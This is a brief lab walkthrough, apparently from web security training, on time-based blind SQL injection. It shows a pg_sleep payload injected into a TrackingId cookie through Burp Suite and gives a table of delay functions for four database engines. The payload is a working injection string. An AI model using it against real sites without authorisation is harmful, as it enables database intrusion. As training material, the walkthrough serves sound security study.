--Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.
--Modify the TrackingId cookie, changing it to:

TrackingId=x'||pg_sleep(10)--

'--Submit the request and observe that the application takes 10 seconds to respond.
   
Oracle	      dbms_pipe.receive_message(('a'),10)
Microsoft	    WAITFOR DELAY '0:0:10'
PostgreSQL	  SELECT pg_sleep(10)
MySQL	        SELECT sleep(10)
